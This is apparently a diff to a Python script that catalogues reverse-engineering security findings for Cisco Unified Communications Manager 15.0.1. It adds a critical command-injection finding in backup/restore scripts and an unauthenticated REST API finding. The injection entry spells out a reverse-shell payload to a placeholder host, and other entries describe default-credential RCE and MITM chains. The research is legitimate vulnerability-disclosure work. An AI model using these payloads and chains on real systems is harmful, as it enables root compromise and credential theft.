@@ -844,9 +844,19 @@ CUCM-F79 HIGH: cm-dirsync JVM arg disableEndpointIdentification=true -- LDAP SSL
   Any network MITM -> present any cert (any CN/SAN) -> intercept all LDAP sync traffic
   Impact: rogue user injection into CUCM directory, steal LDAP bind credentials via LDAP referral, replay enrolled device data
   Chain: F21 (LDAP bind password decryptable via F3 static key), F22 (LDAPS hostname bypass in IMS LDAP) -- systemic
+
+CUCM-F94 CRITICAL: cm-bps BAT DRF bat_do_backup.py / bat_do_restore.py -- third DRF os.system() + sudo tar injection
+  DEVICE_TARBALL/LOGPATH/ENC_SEQ (backup), DEVICE/DEC_SEQ/LOGPATH (restore) from sys.argv directly concatenated into os.system()
+  Restore: command = DEVICE + DEC_SEQ + " | sudo /bin/tar ..." -- DEVICE is first token = command-prefix injection -> root shell
+  Systemic class: F63 (cm-syslog DRF), F67 (cm-reporter DRF), F94 (cm-bps BAT DRF) = three independent vulnerable components
+
+CUCM-F95 MEDIUM: pms.war Jersey JAX-RS FindPhoneByDN + PhoneMigration -- no auth-constraint, container auth not enforced
+  security-constraint has only <transport-guarantee>NONE</transport-guarantee>, no <auth-constraint>
+  FindPhoneByDN: phone MAC-to-DN mapping enumerable without auth; PhoneMigration: upgrade state exposed
+  Chain: F84 (TFTP phone config enumeration -> MACs) -> F95 (FindPhoneByDN -> MAC-to-extension mapping)
 """
 
-VERSION = "3.21.0"
+VERSION = "3.22.0"
 
 import requests
 import urllib3
@@ -1872,6 +1882,8 @@ def full_findings_summary() -> str:
         ("CUCM-F91", "LOW",     "cm-lbm lbmTmpScript.sh: idblj -e \"select ... where name='$hostname'\" -- $hostname from system config (xmlfoo platformConfig.xml) injected unsanitized into Informix SQL; conditional exploitability: requires DHCP/provisioning hostname injection or ability to write platformConfig.xml; on success: SQL context escape in Informix idblj session; chain: F4 (Informix credentials), F13 (ccmivr SQL injection pattern)"),
         ("CUCM-F92", "CRITICAL","generic-util GenericUtils.jar NoOpTrustManager + CustomAxisSocketFactory: SYSTEMIC ROOT CAUSE of all no-op TrustManager findings; NoOpTrustManager: checkClientTrusted()/checkServerTrusted() both empty (no CertificateException possible); getAcceptedIssuers() returns null; CustomAxisSocketFactory.getContext() initializes SSLContext with new NoOpTrustManager[] -> ALL Axis SOAP calls through this factory accept any cert; inter-component CUCM SOAP (AXL/service-to-service) fully MITM-able; chains: F17/F39/F40/F73/F77 (symptom-level findings), F92 = root cause library"),
         ("CUCM-F93", "HIGH",    "cm-soap2-logcollectionservice2 logcollectionservice2.war Axis2 1.4 (axis2-kernel-1.4.jar): hardcoded default admin:axis2 in WEB-INF/conf/axis2.xml (same as F1 for axl.war but separate WAR); AdminService.aar deployed with default creds -> unauthenticated arbitrary .aar deployment = RCE; no WS-Security module loaded (only addressing + soapmonitor); Axis2 1.4 CVE-2010-2103 admin bypass + SSRF; GetOneFile service: whitelist bypass potential if selectLogFiles called to manipulate fileMap with short entries (substring contains() check on canonical path)"),
+        ("CUCM-F94", "CRITICAL","cm-bps BAT DRF bat_do_backup.py / bat_do_restore.py: third independent DRF os.system() + sudo tar injection class (F63/F67/F94 = systemic DRF framework defect); DEVICE_TARBALL/LOGPATH/ENC_SEQ (backup) and DEVICE/DEC_SEQ/LOGPATH (restore) all from sys.argv directly concatenated into os.system shell commands; restore: command = DEVICE + DEC_SEQ + ' | sudo /bin/tar ...' -- DEVICE is first token = command-prefix injection (';bash -i &>/dev/tcp/x/443 <&1 # '); all three injection points reach root via sudo; chain: F63 (cm-syslog DRF), F67 (cm-reporter DRF) -- same class"),
+        ("CUCM-F95", "MEDIUM",  "pms.war (Property Management System integration) Jersey JAX-RS REST API FindPhoneByDN + PhoneMigration (@GET) no <auth-constraint> in <security-constraint>; only <transport-guarantee>NONE</transport-guarantee> present; container-level auth not enforced; FindPhoneByDN: phone MAC-to-DN mapping enumerable without auth; PhoneMigration: exposes migration/upgrade state; chain: F84 (TFTP phone config enumeration -> phone MACs) -> F95 (FindPhoneByDN -> MAC-to-extension map)"),
     ]
     lines = [f"CUCM 15.0.1 RE Findings [{VERSION}] — 2026-08-27", ""]
     for fid, sev, title in findings:
